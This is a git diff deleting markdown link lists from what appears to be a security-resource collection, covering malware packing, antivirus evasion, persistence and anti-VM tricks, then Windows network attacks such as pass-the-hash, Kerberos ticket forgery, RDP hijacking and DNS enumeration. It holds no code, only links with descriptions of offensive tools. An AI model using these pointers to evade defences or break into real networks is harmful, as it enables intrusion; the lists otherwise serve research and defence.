-	* This paper presents a proof of concept executable packer that does not use any custom code to unpack binaries at execution time. This is different from typical packers which generally rely on packed executables containing code that is used to perform the inverse of the packing operation at runtime. Instead of depending on custom code, the technique described in this paper uses documented behavior of the dynamic loader as a mechanism for performing the unpacking operation. This difference can make binaries packed using this technique more difficult to signature and analyze, but only when presented to an untrained eye. The description of this technique is meant to be an example of a fun thought exercise and not as some sort of revolutionary packer. In fact, it's been used in the virus world many years prior to this paper.
-* [Implementing a Custom X86 Encoder](http://uninformed.org/?v=all&a=25&t=sumry)
-	* This paper describes the process of implementing a custom encoder for the x86 architecture. To help set the stage, the McAfee Subscription Manager ActiveX control vulnerability, which was discovered by eEye, will be used as an example of a vulnerability that requires the implementation of a custom encoder. In particular, this vulnerability does not permit the use of uppercase characters. To help make things more interesting, the encoder described in this paper will also avoid all characters above 0x7f. This will make the encoder both UTF-8 safe and tolower safe. 
-* [Using dual-mappings to evade automated unpackers ](http://uninformed.org/?v=all&a=44&t=sumry)
-	* Automated unpackers such as Renovo, Saffron, and Pandora's Bochs attempt to dynamically unpack executables by detecting the execution of code from regions of virtual memory that have been written to. While this is an elegant method of detecting dynamic code execution, it is possible to evade these unpackers by dual-mapping physical pages to two distinct virtual address regions where one region is used as an editable mapping and the second region is used as an executable mapping. In this way, the editable mapping is written to during the unpacking process and the executable mapping is used to execute the unpacked code dynamically. This effectively evades automated unpackers which rely on detecting the execution of code from virtual addresses that have been written to.
-*[Unpacking with OllyBonE](http://www.joestewart.org/ollybone/tutorial.html)
-	* This is a brief tutorial giving the basic steps to unpack code using the OllyBonE plugin.
-
-
-
-Persistence
-* [Poweliks: the persistent malware without a file](https://blog.gdatasoftware.com/blog/article/poweliks-the-persistent-malware-without-a-file.html)
-* [Temporal Persistence with bitsadmin and schtasks](http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html)
-* [Many ways of malware persistence (that you were always afraid to ask) ](http://jumpespjump.blogspot.com/2015/05/many-ways-of-malware-persistence-that.html)
-
-
-
-
-Static Analysis
-* Tools
-	* [Pyew](https://code.google.com/p/pyew/)
-		* Pyew is a (command line) python tool to analyse malware. It does have support for hexadecimal viewing, disassembly (Intel 16, 32 and 64 bits), PE and ELF file formats (it performs code analysis and let you write scripts using an API to perform many types of analysis), follows direct call/jmp instructions in the interactive command line, displays function names and string data references; supports OLE2 format, PDF format and more. It also supports plugins to add more features to the tool.
-	* [Manalyze - static analyzer for PE files](https://github.com/JusticeRage/Manalyze)
-		* Manalyze was written in C++ for Windows and Linux and is released under the terms of the GPLv3 license. It is a robust parser for PE files with a flexible plugin architecture which allows users to statically analyze files in-depth.
-	* [yalda - Gita Ziabari](https://github.com/fideliscyber/yalda)
-		* The tool is designed to analyze the given files and extract malicious data out of the files.
-	* [Presentation](https://www.youtube.com/watch?v=OPRqgEZXWOE)
-	* [Dependency Walker](http://www.dependencywalker.com/)
-		*  Dependency Walker is a free utility that scans any 32-bit or 64-bit Windows module (exe, dll, ocx, sys, etc.) and builds a hierarchical tree diagram of all dependent modules. For each module found, it lists all the functions that are exported by that module, and which of those functions are actually being called by other modules. Another view displays the minimum set of required files, along with detailed information about each file including a full path to the file, base address, version numbers, machine type, debug information, and more.
-
-Techniques
-* [BG00 Injection on Steroids Code less Code Injections and 0 Day Techniques Paul Schofield Udi Yavo](https://www.youtube.com/watch?v=0BAaAM2wD4s)
-	* [[Slides]Injection on Steroids: Code-less Code Injections and 0-Day Techniques](https://breakingmalware.com/injection-techniques/code-less-code-injections-and-0-day-techniques/)
-* [Amoco - Static binary analysis tool](https://github.com/bdcht/amoco)
-	* Amoco is a python package dedicated to the (static) analysis of binaries.
-* [Code Injection Techniques -2013](http://resources.infosecinstitute.com/code-injection-techniques/)
-
-
-
-Virtual Machines
-* [antivmdetection](https://github.com/nsmfoo/antivmdetection)
-	* Script to create templates to use with VirtualBox to make vm detection harder.
-* [Breaking the Sandbox - Sudeep Singh](http://www.exploit-db.com/wp-content/themes/exploit/docs/34591.pdf)
-	* Abstract: In this paper, I would like to discuss various existing and interesting techniques which are used to evade the detection of a virus in Sandbox. We will also look at ways a sandbox can be hardened to prevent such evasion.
-* [On the Cutting Edge: Thwarting Virtual Machine Detection](http://handlers.sans.org/tliston/ThwartingVMDetection_Liston_Skoudis.pdf)
-* [Paranoid Fish](https://github.com/a0rtega/pafish)
-	* Pafish is a demo tool that performs some anti(debugger/VM/sandbox) tricks. Most of them are often used by malware to avoid debugging and dynamic analysis. The project is open source, you can read the code of all anti-analysis checks. You can also download the compiled executable (or compile it by yourself) and reverse engineer it, which is quite recommended.
-* [rdtsc x86 instruction to detect virtual machines](http://blog.badtrace.com/post/rdtsc-x86-instruction-to-detect-vms/)
-* [Win64/Vabushky - The Great Code Heist](http://www.malwaretech.com/2013/09/win64vabushky-great-code-heist.html)
-* [Scientific but Not Academical Overview of Malware Anti-Debugging, Anti-Disassembly and Anti- VM Technologies](http://research.dissect.pe/docs/blackhat2012-paper.pdf)
-	* This talk catalogs the common evasion techniques malware authors employ, applying over 50 different static detections, combined with a few dynamic ones for completeness. We validate our catalog by running these detections against a database of 4 million samples (the system is constantly running and the numbers will be updated for the presentation), enabling us to present an analysis on the real state of evasion techniques in use by malware today. The resulting data will help security companies and researchers around the world to focus their attention on making their tools and processes more efficient to rapidly avoid the malware authors' countermeasures. 
-* [Process Hollowing - Dridex](http://countuponsecurity.com/2015/12/07/malware-analysis-dridex-process-hollowing/)
-* [SubVirt: Implementing malware with virtual machines](http://web.eecs.umich.edu/virtual/papers/king06.pdf)
-	* We evaluate a new type of malicious software that gains qualitatively more control over a system. This new type of malware, which we call a virtual-machine based rootkit (VMBR), installs a virtual-machine monitor underneath an existing operating system and hoists the original operating system into a virtual machine. Virtual-machine based rootkits are hard to detect and remove because their state cannot be accessed by soft- ware running in the target system. Further, VMBRs support general-purpose malicious services by allowing such services to run in a separate operating system that is protected from the target system. We evaluate this new threat by implementing two proof-of-concept VMBRs. We use our proof-of-concept VMBRs to subvert Windows XP and Linux target systems, and we implement four example malicious services using the VMBR platform. Last, we use what we learn from our proof-of-concept VMBRs to explore ways to defend against this new threat. We discuss possible ways to detect and prevent VMBRs, and we implement a defense strategy suitable for protecting systems against this threat.
-* [Modeling Zero Day Malware Spread](https://lqdc.github.io/modeling-zero-day-malware-spread.html)
-* Duping the Machine: malware strategies, post sandbox detection
-	* [Slide deck presentation](https://www.virusbtn.com/pdf/conference_slides/2014/Wyke-VB2014.pdf)
-* [Win32_ComputerSystem class](https://msdn.microsoft.com/en-us/library/aa394102(v=vs.85).aspx)
-* [Win32_BIOS class](https://msdn.microsoft.com/en-us/library/aa394077(v=vs.85).aspx)
-
-
-Windows
-* [Trojan.Foxy writeup](http://www.cyberesi.com/2011/08/31/trojan-foxy/)
-	* Today I will write about a sample that I will refer to as Trojan.Foxy. Trojan.Foxy requests and parses .JPG images that contain encoded instructions. The encoding algorithm used by this Trojan is loosely based off of the Vigenère cipher; however there is a deviation in how the cipher is applied.
-* [Uroburos](https://blog.gdatasoftware.com/blog/article/uroburos-highly-complex-espionage-software-with-russian-roots.html)
-	* `https://www.gdata.de/rdk/dl-en-rp-Uroburos`
-* [Thousand ways to backdoor a Windows domain (forest)](http://jumpespjump.blogspot.com/2015/03/thousand-ways-to-backdoor-windows.html)
-* [COM Object hijacking: the discreet way of persistence](https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html)
-* [Nesting doll: unwrapping Vawtrak](https://www.virusbtn.com/virusbulletin/archive/2015/01/vb201501-Vawtrak)
-* [Rotten Tomatoes campaign by Sophos](http://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/sophos-rotten-tomato-campaign.pdf)
-* [Full details on CVE-2015-0096 and the failed MS10-046 Stuxnet fix](http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VP9cTDTF-PU)
-
-
-
-
-#### Misc
-* [The Backdoor Factory (BDF)](https://github.com/secretsquirrel/the-backdoor-factory)
-	* For security professionals and researchers only.  The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. 
-	* [Derbycon Presentation](https://www.youtube.com/watch?v=LjUN9MACaTs)
-* [How to Bypass Anti-Virus to Run Mimikatz - **Spoiler, AV still suck, changing strings is helpful**](http://www.blackhillsinfosec.com/?p=5555)
-* [peCloak.py - An Experiment in AV Evasion](http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
-* [Making FinFisher Undetectable](https://lqdc.github.io/making-finfisher-undetectable.html)
-* [Bypass AV through several basic/effective techniques](http://packetstorm.foofus.com/papers/virus/BypassAVDynamics.pdf)
-*  [stupid_malware](https://github.com/andrew-morris/stupid_malware)
-	* Python malware for pentesters that bypasses most antivirus (signature and heuristics) and IPS using sheer stupidity
-* [InfectPE](https://github.com/secrary/InfectPE)
-	* Using this tool you can inject x-code/shellcode into PE file. InjectPE works only with 32-bit executable files.
-
-
-* [Frida](http://www.frida.re/docs/home/)
-	* Inject JS into native apps
-* [Maltrail](https://github.com/stamparm/maltrail)
-	* Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. zvpprsensinaix.com for Banjori malware), URL (e.g. http://109.162.38.120/harsh02.exe for known malicious executable), IP address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header value (e.g. sqlmap for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).
-
-[PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
-
-* [Software Distribution Malware Infection Vector](http://dl.packetstormsecurity.net/papers/general/Software.Distribution.Malware.Infection.Vector.pdf)
-	* In this paper we present an efficient mechanism as well as  the  corresponding  reference  implementation  for  on- the-fly infecting of executable code with malicious soft- ware. Our algorithm deploys virus infection routines and network redirection attacks, without requiring to modify the application itself. This allows to even infect executa- bles with a embedded signature when the signature is not automatically verified before execution.  We briefly dis- cuss also countermeasures such as secure channels, code authentication  as  well  as  trusted  virtualization  that  en- ables the isolation of untrusted downloads from other ap- plication running in trusted domains or compartments.
-* [Statistical Structures: Fingerprinting Malware for Classification and Analysis - Daniel Bilar](https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Bilar.pdf)
-* [Malware Guard Extension: Using SGX to Conceal Cache Attacks](https://arxiv.org/abs/1702.08719)
-	* In this paper, we demonstrate fine-grained software-based side-channel attacks from a malicious SGX enclave targeting co-located enclaves. Our attack is the first malware running on real SGX hardware, abusing SGX protection features to conceal itself. Furthermore, we demonstrate our attack both in a native environment and across multiple Docker containers. We perform a Prime+Probe cache side-channel attack on a co-located SGX enclave running an up-to-date RSA implementation that uses a constant-time multiplication primitive. The attack works although in SGX enclaves there are no timers, no large pages, no physical addresses, and no shared memory. In a semi-synchronous attack, we extract 96% of an RSA private key from a single trace. We extract the full RSA private key in an automated attack from 11 traces within 5 minutes.
\ No newline at end of file
diff --git a/Draft/Network Attacks & Defenses.md b/Draft/Network Attacks & Defenses.md
deleted file mode 100755
index 454af8e..0000000
--- a/Draft/Network Attacks & Defenses.md	
+++ /dev/null
@@ -1,769 +0,0 @@
-# Network Attacks & Defenses
-
-### ToC
-* [General](#general)
-* [Attacking Windows Networks](#attackw)
-	* [Lateral Movement](#lateral)
-	* [Active Directory](#AD)
-	* [Sharepoint](#sharepoint)
-* [General tools](#generaltools)
-* [DNS](#dns)
-* [D/DOS](#ddos)
-* [Email](#email)
-* [Frameworks](#frameworks)
-* [IDS/IPS Evasion](#evasion)
-* [IPMI](#ipmi)
-* [IPv6 Related](#ipv6)
-* [LDAP](#ldap)
-* [Man-in-the-Middle Tools](#mitm)
-* [Netbios](#netbios)
-* [Network Host/Service Discovery](#host)
-* [NFS](#nfs)
-* [Pivoting](#pivot)
-* [Proxies](#proxy)
-* [Software Defined Networking(SDN)](#sdn)
-* [SSH](#ssh)
-* [SQL](#sql)
-* [SNMP](#snmp)
-* [SIP/VOIP](#sip)
-* [SSL/TLS](#ssl)
-* [STP](#stp)
-* [MISC](#misc)
-* [Talks/Videos](#videos)
-* [UPNP](#upnp)
-* [Web](#web)
-* [Writeups](#writeups)
-* [Other](#other)
-
---------
-##### To be sorted
-http://www.pentest-standard.org/index.php/Intelligence_Gathering
-* [CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
-	* Remote root exploit for the SAMBA CVE-2017-7494 vulnerability
-* [10 Places to Stick Your UNC Path - NetSPI](https://blog.netspi.com/10-places-to-stick-your-unc-path/)
-* [HackerOne H1-212 Capture the Flag Solution - Corben Douglas](http://www.sxcurity.pro/H1-212%20CTF%20Solution.pdf)
-##### sort end
-
-------------
-### <a name="general"></a>General
-* [Fundamentals That Time Forgot - Jup1t3r  - BSides SLC](https://www.youtube.com/watch?v=PQvUWImljOw)
-* [pynessus](https://github.com/rmusser01/pynessus)
-	* Python Parser for Nessus Output
-* [Examples](http://www.hackwhackandsmack.com/?p=422)
-* [TCPDump Primer](http://danielmiessler.com/study/tcpdump/)
-* [IANA Complete list of assigned ports](http://www.vulnerabilityassessment.co.uk/port-numbers.txt)
-* [which-cloud](https://github.com/bcoe/which-cloud)
-	* Given an ip address, return which cloud provider it belongs to (AWS, GCE, etc)  
-* [RFC 2827 -  Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing](https://tools.ietf.org/html/rfc2827)
-* [RFC 5246 - The Transport Layer Security (TLS) Protocol Version 1.2](https://tools.ietf.org/html/rfc5246)
-* [TCPDump Command Examples](http://www.thegeekstuff.com/2010/08/tcpdump-command-examples/)
-* [The Eavesdropper’s Dillemma](http://www.crypto.com/papers/internet-tap.pdf)
-* [Strange Attractors and TCP/IP Sequence Number Analysis  - Michal Zalewski](http://lcamtuf.coredump.cx/oldtcp/tcpseq.html)
-
-------------
-### <a name="attackw">Attacking Windows Networks</a>
-* [Introducing PowerShell into your Arsenal with PS>Attack - Jared Haight](http://www.irongeek.com/i.php?page=videos/derbycon6/119-introducing-powershell-into-your-arsenal-with-psattack-jared-haight)
-* [Get-Help: An Intro to PowerShell and How to Use it for Evil - Jared Haight](https://www.psattack.com/presentations/get-help-an-intro-to-powershell-and-how-to-use-it-for-evil/)
-* [ShareCheck Windows Enumeration Tool v2.0 - sec1](http://www.sec-1.com/blog/2014/sharecheck)
-* Lateral Movement
-	* [*Puff* *Puff* PSExec - Lateral Movement: An Overview](https://www.toshellandback.com/2017/02/11/psexec/)
-	* [Ditch PsExec, SprayWMI is here ;)](http://www.pentest.guru/index.php/2015/10/19/ditch-psexec-spraywmi-is-here/)
-	* [WMIOps](https://github.com/ChrisTruncer/WMIOps)
-		* WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. It's designed primarily for use on penetration tests or red team engagements.
-	* [spraywmi](https://github.com/trustedsec/spraywmi)
-		* SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.
-	* [psexec](https://github.com/pentestgeek/smbexec)
-		* A rapid psexec style attack with samba tools
-		* [Blogpost that inspired it](http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html)
-	* [sshuttle](https://github.com/apenwarr/sshuttle)
-		* Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
-	* [PowerShell PSRemoting Pwnage](https://pentestn00b.wordpress.com/2016/08/22/powershell-psremoting-pwnage/)
-	* [PowerShell Remoting for Penetration Testers ](https://lockboxx.blogspot.com/2015/07/powershell-remoting-for-penetration.html)
-* Pass-the-Hash
-	* [Pass the hash - Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)
-	* [Pass the hash attacks: Tools and Mitigation - 2010 SANS paper](https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283)
-	* [Performing Pass-the-Hash Attacks with Mimikatz](https://blog.stealthbits.com/passing-the-hash-with-mimikatz)
-	* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
-	* [Still Passing the Hash 15 Years Later](https://passing-the-hash.blogspot.com/)
-		* Providing all the extra info that didn't make it into the BlackHat 2012 USA Presentation "Still Passing the Hash 15 Years Later? Using the Keys to the Kingdom to Access All Your Data" by Alva Lease 'Skip' Duckwall IV and Christopher Campbell.
-	* [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
-		* Invoke-TheHash contains PowerShell functions for performing pass the hash WMI and SMB tasks. WMI and SMB services are accessed through .NET TCPClient connections. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privilege is not required client-side.
-* Passing the Ticket Attacks
-	* [How To Pass the Ticket Through SSH Tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
-	* [Mimikatz and Active Directory Kerberos Attacks ](https://adsecurity.org/?p=556)
-	* Silver Tickets
-		* [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)
-	* Gold Tickets
-		* [mimikatz - Golden Ticket](http://rycon.hu/papers/goldenticket.html)
-		* [The Golden Ticket Attack - A Look Under The Hood](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)
-		* [Kerberos Golden Ticket Protection Mitigating Pass-the-Ticket on Active Directory - CERT-EU](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)
-		* [The path to the Golden Ticket](https://countuponsecurity.com/tag/pass-the-ticket/)
-	* [The Secret Life of KRBTGT](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)
-	* [From Pass-the-Hash to Pass-the-Ticket with No Pain](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)
-* RDP
-	* [RDP hijacking-how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
-	* [RDP Man-in-The-Middle attack ](https://theevilbit.blogspot.com/2014/04/rdp-man-in-middle-attack.html)
-	* [ATTACKING RDP How to Eavesdrop on Poorly Secured RDP Connections - Adrian Vollmer 2017](https://www.exploit-db.com/docs/41621.pdf)
-	* [RDPY](https://github.com/citronneur/rdpy)
-		* RDPY is a pure Python implementation of the Microsoft RDP (Remote Desktop Protocol) protocol (client and server side). RDPY is built over the event driven network engine Twisted. RDPY support standard RDP security layer, RDP over SSL and NLA authentication (through ntlmv2 authentication protocol).
-	* [SSL -Man-In-The-Middle- attacks on RDP](https://web.archive.org/web/20161007044945/https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/)
-	* [rdps2rdp](https://github.com/DiabloHorn/rdps2rdp)
-		* Decrypt MITM SSL RDP and save to pcap
-* Active Directory
-	* Check under privesc/postex for More info
-	* [Active Directory - Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)
-	* [AD Security Active Directory Resources](https://adsecurity.org/?page_id=41)
-	* [AD Reading: Active Directory Core Concepts](http://adsecurity.org/?p=15)
-	* [AD Reading: Active Directory Authentication & Logon](http://adsecurity.org/?p=20)
-	* [MS Network Level Authentication](https://technet.microsoft.com/en-us/magazine/hh750380.aspx)
-* Recon
-	* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-		* PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows "net *" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.
-	* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
-		* AD PowerShell Recon Scripts
-	* [Netview](https://github.com/mubix/netview)
-		* Netview is a enumeration tool. It uses (with the -d) the current domain or a specified domain (with the -d domain) to enumerate hosts
-	* [DomainTrustExplorer](https://github.com/sixdub/DomainTrustExplorer)
-		* Python script for analyis of the "Trust.csv" file generated by Veil PowerView. Provides graph based analysis and output. The graph output will represent access direction (opposite of trust direction) 
-* Getting Credentials	
-	* [Dumping a Domain-s Worth of Passwords With Mimikatz pt. 2](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)
-	* [LLMNR and NBT-NS Poisoning Using Responder](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
-	* [Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)
-* Getting Domain Admin
-	* [Attack Methods for Gaining Domain Admin Rights in Active Directory - hackingandsecurity](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)
-* Kerberos
-	* [Abusing Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf)
-	* [krb5-enum-users - nse script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html)
-		* Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication. 
-* Slides
-	* [Windows Attacks AT is the new black](https://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607)
-* Tools
-	* [Responder](https://github.com/SpiderLabs/Responder/)
-		* Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
-	* [Enum4Linux](https://labs.portcullis.co.uk/tools/enum4linux/)
-		* Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. The tool usage can be found below followed by examples, previous versions of the tool can be found at the bottom of the page.
-* Sharepoint
-	* [MS Sharepoint - Wikipedia](https://en.wikipedia.org/wiki/SharePoint)
-* Tools
-	* [Sparty - MS Sharepoint and Frontpage Auditing Tool](http://sparty.secniche.org/)
-		* Sparty is an open source tool written in python to audit web applications using sharepoint and frontpage architecture. The motivation behind this tool is to provide an easy and robust way to scrutinize the security configurations of sharepoint and frontpage based web applications. Due to the complex nature of these web administration software, it is required to have a simple and efficient tool that gathers information, check access permissions, dump critical information from default files and perform automated exploitation if security risks are identified. A number of automated scanners fall short of this and Sparty is a solution to that.
-	* [SPScan](http://sourceforge.net/projects/spscan/)
-		* SPScan is a tool written in Ruby that enumerates a SharePoint installation gathering information about the version and installed plugins.
-	* [SPartan](https://github.com/sensepost/SPartan)
-		* SPartan is a Frontpage and Sharepoint fingerprinting and attack tool
-
-
-------------
-### <a name="tools">General Tools</a>
-* [Yersinia](http://www.yersinia.net/)
-	* Yersinia is a network tool designed to take advantage of some weakeness in different network protocols. It pretends to be a solid framework for analyzing and testing the deployed networks and systems. 
-* [netcat](http://nc110.sourceforge.net/)
-	* Network Swiss army knife. Ncat-s predecessor. Does everything and the kitchen sink.
-* [Ncat](http://nmap.org/)
-	* Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat. It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses.
-* [RANCID - Really Awesome New Cisco confIg Differ](http://www.shrubbery.net/rancid/)
-	* RANCID monitors a router's (or more generally a device's) configuration, including software and hardware (cards, serial numbers, etc) and uses CVS (Concurrent Version System) or Subversion to maintain history of changes. RANCID does this by the very simple process summarized as: login to each device in the router table (router.db), run various commands to get the information that will be saved, cook the output; re-format, remove oscillating or incrementing data, email any differences (sample) from the previous collection to a mail list, and finally commit those changes to the revision control system
-
-
-
-
-
-------------
-#### <a name="activemq"></a>Apache ActiveMQ
-* [a](https://github.com/fmtn/a)
-	* ActiveMQ CLI testing and message management
-* [Apache ActiveMQ - Wikipedia](https://en.wikipedia.org/wiki/Apache_ActiveMQ)
-* [ActiveMQ](http://activemq.apache.org/)
-* [Getting Started](http://activemq.apache.org/getting-started.html)
-* [What is ActiveMQ used for? - StackOverflow](https://stackoverflow.com/questions/12805377/what-is-activemq-used-for)
-
-
-
-
-------------
-#### <a name="bitsquat"></a>BitSquatting:
-* [DEFCON 19: Bit-squatting: DNS Hijacking Without Exploitation (w speaker)](https://www.youtube.com/watch?v=aT7mnSstKGs)
-	* [Bitsquatting - DNS Hijacking without Exploitation - Artem Dinaburg](https://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf)
-	* [Blogpost - Bitsquatting: DNS Hijacking without exploitation](http://dinaburg.org/bitsquatting.html)
-[Bitsquatting - benjaminpetrin](https://github.com/benjaminpetrin/bitsquatting)
-	* This repository includes a simple toy DNS server written in Python3 for use in conducting research in bitsquatting (bitsquat_dns.py). It also includes a helper script for generating the necessary permutations of a domain (domain_gen.py). The remainder of this README includes further documentation of the included DNS server, and a brief summary of my results running this on the web for a period in 2015.
-* [Bitsquatting: Exploiting Bit-flips for Fun, or Profit?](http://www.securitee.org/files/bitsquatting_www2013.pdf)
-* [digbit](https://github.com/mnmnc/digbit/blob/master/README.md)
-	* Automatic domain generation for BitSquatting
-
-
-------------
-#### <a name="dns"></a>DNS:
-* Attacks
-	* [DNS Cache Snooping or Snooping the Cache for Fun and Profit - Luis Grangeia](http://cs.unc.edu/~fabian/course_papers/cache_snooping.pdf)
-	* [DNS Dark Matter Discovery Theres Evil In Those Queries - Jim Nitterauer](https://www.youtube.com/watch?v=-A2Wqagz73Y)
-	* [DNS hijacking using cloud providers - Frans Ros-n](https://www.youtube.com/watch?v=HhJv8CU-RIk)
-	* [Enumerating DNSSEC NSEC and NSEC3 Records](https://www.altsci.com/concepts/page.php?s=dnssec&p=1)
-	* [DNS database espionage](http://dnscurve.org/espionage2.html)
-	* [DNS May Be Hazardous to Your Health - Robert Stucke](https://www.youtube.com/watch?v=ZPbyDSvGasw)
-		* Great talk on attacking DNS
-	* [A penetration tester’s guide to sub-domain enumeration](https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6)
-	* [Secrets of DNS Ron Bowes - Derbycon4](https://www.youtube.com/watch?v=MgO-gPiVTSc)
-* Educational
-	* [DNS RFC - Domain Name System RFC's (IETF)](http://www.bind9.net/rfc)
-	* [RFC 1034 - DOMAIN NAMES - CONCEPTS AND FACILITIES](https://www.ietf.org/rfc/rfc1034.txt)
-	* [RFC 1035 - DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION](https://www.ietf.org/rfc/rfc1035.txt)
-	* [DNS Reference Information - technet](https://technet.microsoft.com/en-us/library/dd197499(v=ws.10).aspx)
-	* [DNS Records: an Introduction](https://www.linode.com/docs/networking/dns/dns-records-an-introduction)
-* SubDomain
-	* [Sub-domain enumeration - Reference](https://gist.github.com/yamakira/2a36d3ae077558ac446e4a89143c69ab)
-	* [Altdns](https://github.com/infosec-au/altdns)
-		* Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of.
-	* [AQUATONE](https://github.com/michenriksen/aquatone)
-		* AQUATONE is a set of tools for performing reconnaissance on domain names. It can discover subdomains on a given domain by using open sources as well as the more common subdomain dictionary brute force approach. After subdomain discovery, AQUATONE can then scan the hosts for common web ports and HTTP headers, HTML bodies and screenshots can be gathered and consolidated into a report for easy analysis of the attack surface.
-	* [Sublist3r](https://github.com/aboul3la/Sublist3r)
-		* Fast subdomains enumeration tool for penetration testers
-	* [dns-parallel-prober](https://github.com/lorenzog/dns-parallel-prober)
-		* This script is a proof of concept for a parallelised domain name prober. It creates a queue of threads and tasks each one to probe a sub-domain of the given root domain. At every iteration step each dead thread is removed and the queue is replenished as necessary.
-	* [enumall](https://github.com/Dhayalan96/enumall)
-		* Script to enumerate subdomains, leveraging recon-ng. Uses google scraping, bing scraping, baidu scraping, yahoo scarping, netcraft, and bruteforces to find subdomains. Plus resolves to IP.
-	* [Knockpy](https://github.com/guelfoweb/knock)
-		* Knockpy is a python tool designed to enumerate subdomains on a target domain through a wordlist. It is designed to scan for DNS zone transfer and to try to bypass the wildcard DNS record automatically if it is enabled.
-	* [sub6](https://github.com/YasserGersy/sub6)
-		* subdomain take over detector and crawler
-* Service
-	* [DNS Dumpster](DNSdumpster.com)
-		* free domain research tool that can discover hosts related to a domain. Finding visible hosts from the attackers perspective is an important part of the security assessment process
-* Tools
-	* [DNSRecon](https://github.com/darkoperator/dnsrecon)
-		* [Quick Reference Guide](http://pentestlab.wordpress.com/2012/11/13/dns-reconnaissance-dnsrecon/)
-	* [dns-discovery](https://github.com/mafintosh/dns-discovery)
-		* Discovery peers in a distributed system using regular dns and multicast dns.
-	* [TXTDNS](http://www.txdns.net/)
